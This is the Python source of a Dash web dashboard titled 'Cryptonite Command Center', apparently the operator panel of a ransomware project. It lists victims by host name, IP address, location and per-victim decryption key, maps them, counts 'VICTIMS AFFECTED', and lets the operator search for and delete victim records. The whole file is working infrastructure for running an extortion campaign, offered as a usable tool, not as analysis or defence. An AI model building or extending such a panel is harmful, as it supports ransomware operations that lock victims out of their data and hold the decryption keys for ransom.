import plotly.graph_objects as go
import dash
from dash import html
from dash import dcc
from dash import dash_table
from dash import Input, Output, State, callback_context
import dash_daq as daq

import pandas as pd
from lib import retrieveinfo

querygen = "heh"

df = pd.DataFrame({

                    "Unique Key": [],
                    "Host Name": [],
                    "Decryption Key": [],
                    "IP Address": [],
                    "Latitude": [],
                    "Longitude": [],
                    "Place": [],
                    
                })

lat = retrieveinfo.fetch_data()[4]
long = retrieveinfo.fetch_data()[5]
place = retrieveinfo.fetch_data()[6]
unique_key = retrieveinfo.fetch_data()[0]
hostname = retrieveinfo.fetch_data()[1]
dec_key = retrieveinfo.fetch_data()[2]
ip = retrieveinfo.fetch_data()[3]


df["Latitude"] = lat
df["Longitude"] = long
df["IP Address"] = ip
df["Place"] = place
df["Unique Key"] = unique_key
df["Host Name"] = hostname
df["Decryption Key"] = dec_key 

mapbox_access_token = open(".map_token").read()

count = len(ip) 

# INITIATE THE DASH APP
app = dash.Dash(title="COMMAND CENTER")

# COLORS DICTIONARY
colors = {
    'background': '#111111',
    'text': '#7FDBFF'
}

# THEME FOR THEME PROVIDER
theme = {
    'dark': False,
    'detail': 'blue',
    'primary': '#7FDBFF',
    'secondary': 'grey'
}

# MAP DATA
figa = go.Figure(go.Scattermapbox(                       
        lat=df["Latitude"],
        lon=df["Longitude"],
        mode='markers',
        hoverlabel=go.scattermapbox.Hoverlabel(
            bgcolor='#451a8a',
            bordercolor='white'
        ),
        marker=go.scattermapbox.Marker(
            size=14,
            color='#00ffdd'
        ),
        hovertext='<b>' + df["IP Address"] + '</b>' + '<br>' + df["Place"],
    ))

# MAP UPDATES
figa.update_layout(                                      
    hovermode='closest',
    paper_bgcolor=colors['background'],                 
    mapbox=dict(
        accesstoken=mapbox_access_token,
        bearing=0,
        center=go.layout.mapbox.Center(
            lat=0,
            lon=0
        ),
        style="dark",
        pitch=40,
        zoom=3,
        
    ),
    height=800  
)


# APP LAYOUT BEGINS
app.layout = html.Div(style={'backgroundColor': colors['background']},children=[
    html.Button(
        html.Div(
            style={
                'backgroundColor': colors["background"],
                'color': 'white',
                'width': '75px',
                'padding': '5px',
                'fontSize': '20px',
                'fontFamily': 'Calibri',
                'textAlign': 'center',
            },
            children=[
                "RELOAD"
            ]
        ),
        id = "reload",
        style={
                'backgroundColor': colors['text'],
                'color': 'black',
                'fontSize': '19px',
                'border': f'1px solid {colors["text"]}',
                'position': 'absolute',
                'right': '5px',
                'top': '5px'
            }
    ),


    html.Div(style={"display":'flex', 'justify-content': 'center', 'align-items': 'center'},
    children=[
                html.H1(children='Cryptonite Command Center', style={
                    'color': colors["text"],
                    'font-family': 'Helvetica',
                    'font-size': '50px'
                })
            ]),

# LED DISPLAY
    html.Div(
        daq.LEDDisplay(
            id='led_display',
            label={
                'label': "VICTIMS AFFECTED",
                'style': {
                    'color': 'white',
                    'fontFamily': 'calibri',
                    'fontSize': '30px'
                }
            },
            labelPosition="bottom",
            size='64',
            value=count,
            backgroundColor=colors["background"]
        ),
    ),

# MAP
    html.Div(style={'border': f'2px solid {colors["text"]}', 'margin': '10px', 'marginTop': '40px'}, children=[
        dcc.Graph(id="graph", figure=figa)
    ]),

# TABLE HEADING
    html.Div(
        style={
            'color': colors["text"],
            'font-family': 'Helvetica',
            'font-size': '50px',
            'marginTop': '40px',
            'textAlign': 'center',
            'marginBottom': '20px'
        },
        children=["DETAILS OF VICTIMS"]
    ),

# SEARCH, DELETE
    html.Div(children=[

        html.Div(
            style={
                'display': 'flex',
                'justifyContent': 'center',
                'marginBottom': '20px',
            },
            children=[
                dcc.Input(
                    id="search",
                    type="text",
                    value="Search using Unique Key",
                    style={
                        'backgroundColor': colors['background'],
                        'color': colors["text"],
                        'fontSize': '19px',
                        'width': '30%',
                        'padding': '10px',
                        'marginRight': '10px'
                        
                    }
                ),

                html.Button(
                        'SUBMIT', 
                        id="submit",
                        n_clicks=0,
                        style={
                            'backgroundColor': colors['text'],
                            'color': 'black',
                            'fontSize': '19px',
                            'border': f'2px solid {colors["text"]}',
                            'marginRight': '5px'
                        }
                    ),

                html.Button(
                        'DELETE', 
                        id="delete",
                        n_clicks=0,
                        style={
                            'backgroundColor': 'red',
                            'color': 'white',
                            'fontSize': '19px',
                            'border': '2px solid white',
                            'marginRight': '5px'
                        }
                    ),          
            ]
        )    
    ]),

# TABLE SHOWING ALL VICTIMS' DETAILS
    html.Div(style={'position': 'relative', 'left': '10%', 'paddingBottom': '20px'},children=[
        dash_table.DataTable(
            id="table",
            data = df.to_dict('records'),
            fixed_rows = {'headers': True, 'data': 0},
            columns=[{'id': c, 'name': c} for c in df.columns],
            page_action='none',
            style_table={'height': '100%', 'width': '80%', 'backgroundColor': colors['background'], 'border': f'2px solid {colors["text"]}'},
            virtualization=True,
            style_header={'textAlign': 'center', 'backgroundColor': colors["background"], 'color': colors["text"], 'fontSize': '19px', 'fontWeight': 'bold', 'fontFamily': 'Calibri'},
            style_data={'backgroundColor': colors["background"], 'color': 'white', 'fontFamily': 'Calibri', 'padding': '5px'},
            style_cell_conditional=[
                {'if': {'column_id': 'Unique Key'},
                'width': '8%',
                'textAlign': 'left'},
                {'if': {'column_id': 'Host Name'},
                'width': '8%',
                'textAlign': 'left'},
                {'if': {'column_id': 'Decryption Key'},
                'width': '10%',
                'textAlign': 'left'},
                {'if': {'column_id': 'IP Address'},
                'width': '10%',
                'textAlign': 'left'},
                {'if': {'column_id': 'Latitude'},
                'width': '5%',
                'textAlign': 'left'},
                {'if': {'column_id': 'Longitude'},
                'width': '5%',
                'textAlign': 'left'},
                {'if': {'column_id': 'Place'},
                'width': '20%',
                'textAlign': 'left'},
            ]
        ),
    ]),
])


# CALLBACKS
@app.callback(
    Output('graph', 'figure'),
    Output('table', 'data'),
    Output('led_display', 'value'),
    Input('submit', 'n_clicks'),
    Input('delete', 'n_clicks'),
    Input('reload', 'n_clicks'),
    State('search', 'value'),
    State('led_display', 'value')
)
def update_map(n_clicks_submit, n_clicks_delete, n_clicks_reload, value, count_value):

    global df
    global querygen
    global figa
    global mapbox_access_token

    dafa = df

    changed_id = [p['prop_id'] for p in callback_context.triggered][0]

    if 'submit' in changed_id:
    
        try:
            result = retrieveinfo.query(value)
            dafa = pd.DataFrame({

                            "Unique Key": [],
                            "Host Name": [],
                            "Decryption Key": [],
                            "IP Address": [],
                            "Latitude": [],
                            "Longitude": [],
                            "Place": [],
                        })

            lat = result[4]
            long = result[5]
            place = result[6]
            unique_key = result[0]
            hostname = result[1]
            dec_key = result[2]
            ip = result[3]
            count = len(result[4])

            if count != 0:
                querygen = value
                dafa["Latitude"] = lat
                dafa["Longitude"] = long
                dafa["IP Address"] = ip
                dafa["Place"] = place
                dafa["Unique Key"] = unique_key
                dafa["Host Name"] = hostname
                dafa["Decryption Key"] = dec_key 

                fig = go.Figure(go.Scattermapbox(                       
                    lat=dafa["Latitude"],
                    lon=dafa["Longitude"],
                    mode='markers',
                    hoverlabel=go.scattermapbox.Hoverlabel(
                        bgcolor='#451a8a',
                        bordercolor='white'
                    ),
                    marker=go.scattermapbox.Marker(
                        size=14,
                        color='#00ffdd'
                    ),
                    hovertext='<b>' + dafa["IP Address"] + '</b>' + '<br>' + dafa["Place"],
                ))
                return (fig.update_layout(                                      
                    hovermode='closest',
                    paper_bgcolor=colors['background'],                 
                    mapbox=dict(
                        accesstoken=mapbox_access_token,
                        bearing=0,
                        center=go.layout.mapbox.Center(
                            lat=float(dafa["Latitude"][0]),
                            lon=float(dafa["Longitude"][0])
                        ),
                        style="dark",
                        pitch=40,
                        zoom=10,
                    
                    ),
                    height=800 
                ), dafa.to_dict('records'), count)

            else:
            
                return(figa.update_layout(
                hovermode='closest',
                paper_bgcolor=colors['background'],                 
                mapbox=dict(
                    accesstoken=mapbox_access_token,
                    bearing=0,
                    center=go.layout.mapbox.Center(
                        lat=0,
                        lon=0
                    ),
                    style="dark",
                    pitch=40,
                    zoom=3,
                
                ),
                height=800 
                ), df.to_dict('records'), count)

        except:
        
            return(figa.update_layout(
                 hovermode='closest',
                paper_bgcolor=colors['background'],                 
                mapbox=dict(
                    accesstoken=mapbox_access_token,
                    bearing=0,
                    center=go.layout.mapbox.Center(
                        lat=0,
                        lon=0
                    ),
                    style="dark",
                    pitch=40,
                    zoom=3,
                
                ),
                height=800 
            ), df.to_dict('records'), count_value)

    elif 'delete' in changed_id:
        if querygen != "heh":
            retrieveinfo.delete(querygen)
        
            querygen = "heh"

            result = retrieveinfo.fetch_data()
            df = pd.DataFrame({

                            "Unique Key": [],
                            "Host Name": [],
                            "Decryption Key": [],
                            "IP Address": [],
                            "Latitude": [],
                            "Longitude": [],
                            "Place": [],
                        })

            lat = result[4]
            long = result[5]
            place = result[6]
            unique_key = result[0]
            hostname = result[1]
            dec_key = result[2]
            ip = result[3]
            count = len(result[4])

            if count != 0:

                df["Latitude"] = lat
                
                df["Longitude"] = long
                df["IP Address"] = ip
                df["Place"] = place
                df["Unique Key"] = unique_key
                df["Host Name"] = hostname
                df["Decryption Key"] = dec_key 

                figa = go.Figure(go.Scattermapbox(                       
                    lat=df["Latitude"],
                    lon=df["Longitude"],
                    mode='markers',
                    hoverlabel=go.scattermapbox.Hoverlabel(
                        bgcolor='#451a8a',
                        bordercolor='white'
                    ),
                    marker=go.scattermapbox.Marker(
                        size=14,
                        color='#00ffdd'
                    ),
                    hovertext='<b>' + df["IP Address"] + '</b>' + '<br>' + df["Place"],
                ))
                return (figa.update_layout(                                      
                    hovermode='closest',
                    paper_bgcolor=colors['background'],                 
                    mapbox=dict(
                        accesstoken=mapbox_access_token,
                        bearing=0,
                        center=go.layout.mapbox.Center(
                            lat=float(df["Latitude"][0]),
                            lon=float(df["Longitude"][0])
                        ),
                        style="dark",
                        pitch=40,
                        zoom=3,
                    
                    ),
                    height=800 
                ), df.to_dict('records'), count)

            else:
                
                df["Latitude"] = lat
                
                df["Longitude"] = long
                df["IP Address"] = ip
                df["Place"] = place
                df["Unique Key"] = unique_key
                df["Host Name"] = hostname
                df["Decryption Key"] = dec_key 

                figa = go.Figure(go.Scattermapbox(                       
                    lat=df["Latitude"],
                    lon=df["Longitude"],
                    mode='markers',
                    hoverlabel=go.scattermapbox.Hoverlabel(
                        bgcolor='#451a8a',
                        bordercolor='white'
                    ),
                    marker=go.scattermapbox.Marker(
                        size=14,
                        color='#00ffdd'
                    ),
                    hovertext='<b>' + df["IP Address"] + '</b>' + '<br>' + df["Place"],
                ))

                return(figa.update_layout(
                 hovermode='closest',
                paper_bgcolor=colors['background'],                 
                mapbox=dict(
                    accesstoken=mapbox_access_token,
                    bearing=0,
                    center=go.layout.mapbox.Center(
                        lat=0,
                        lon=0
                    ),
                    style="dark",
                    pitch=40,
                    zoom=3,
                
                ),
                height=800 
            ), df.to_dict('records'), count)

        else:
            return(figa.update_layout(
                 hovermode='closest',
                paper_bgcolor=colors['background'],                 
                mapbox=dict(
                    accesstoken=mapbox_access_token,
                    bearing=0,
                    center=go.layout.mapbox.Center(
                        lat=0,
                        lon=0
                    ),
                    style="dark",
                    pitch=40,
                    zoom=3,
                
                ),
                height=800 
            ), df.to_dict('records'), count_value)

    elif 'reload' in changed_id:
            print('reload clicked')
            result = retrieveinfo.fetch_data()
            df = pd.DataFrame({

                            "Unique Key": [],
                            "Host Name": [],
                            "Decryption Key": [],
                            "IP Address": [],
                            "Latitude": [],
                            "Longitude": [],
                            "Place": [],
                        })

            lat = result[4]
            long = result[5]
            place = result[6]
            unique_key = result[0]
            hostname = result[1]
            dec_key = result[2]
            ip = result[3]
            count = len(result[4])

            if count != 0:

                df["Latitude"] = lat
                
                df["Longitude"] = long
                df["IP Address"] = ip
                df["Place"] = place
                df["Unique Key"] = unique_key
                df["Host Name"] = hostname
                df["Decryption Key"] = dec_key 

                figa = go.Figure(go.Scattermapbox(                       
                    lat=df["Latitude"],
                    lon=df["Longitude"],
                    mode='markers',
                    hoverlabel=go.scattermapbox.Hoverlabel(
                        bgcolor='#451a8a',
                        bordercolor='white'
                    ),
                    marker=go.scattermapbox.Marker(
                        size=14,
                        color='#00ffdd'
                    ),
                    hovertext='<b>' + df["IP Address"] + '</b>' + '<br>' + df["Place"],
                ))
                return (figa.update_layout(                                      
                    hovermode='closest',
                    paper_bgcolor=colors['background'],                 
                    mapbox=dict(
                        accesstoken=mapbox_access_token,
                        bearing=0,
                        center=go.layout.mapbox.Center(
                            lat=float(df["Latitude"][0]),
                            lon=float(df["Longitude"][0])
                        ),
                        style="dark",
                        pitch=40,
                        zoom=3,
                    
                    ),
                    height=800 
                ), df.to_dict('records'), count)
            
            else:
                
                df["Latitude"] = lat
                
                df["Longitude"] = long
                df["IP Address"] = ip
                df["Place"] = place
                df["Unique Key"] = unique_key
                df["Host Name"] = hostname
                df["Decryption Key"] = dec_key 

                figa = go.Figure(go.Scattermapbox(                       
                    lat=df["Latitude"],
                    lon=df["Longitude"],
                    mode='markers',
                    hoverlabel=go.scattermapbox.Hoverlabel(
                        bgcolor='#451a8a',
                        bordercolor='white'
                    ),
                    marker=go.scattermapbox.Marker(
                        size=14,
                        color='#00ffdd'
                    ),
                    hovertext='<b>' + df["IP Address"] + '</b>' + '<br>' + df["Place"],
                ))

                return(figa.update_layout(
                 hovermode='closest',
                paper_bgcolor=colors['background'],                 
                mapbox=dict(
                    accesstoken=mapbox_access_token,
                    bearing=0,
                    center=go.layout.mapbox.Center(
                        lat=0,
                        lon=0
                    ),
                    style="dark",
                    pitch=40,
                    zoom=3,
                
                ),
                height=800 
            ), df.to_dict('records'), count)

    else:
        return(figa.update_layout(
                 hovermode='closest',
                paper_bgcolor=colors['background'],                 
                mapbox=dict(
                    accesstoken=mapbox_access_token,
                    bearing=0,
                    center=go.layout.mapbox.Center(
                        lat=0,
                        lon=0
                    ),
                    style="dark",
                    pitch=40,
                    zoom=3,
                
                ),
                height=800 
            ), df.to_dict('records'), count_value)
    


if __name__ == "__main__":
    app.run_server(debug=False)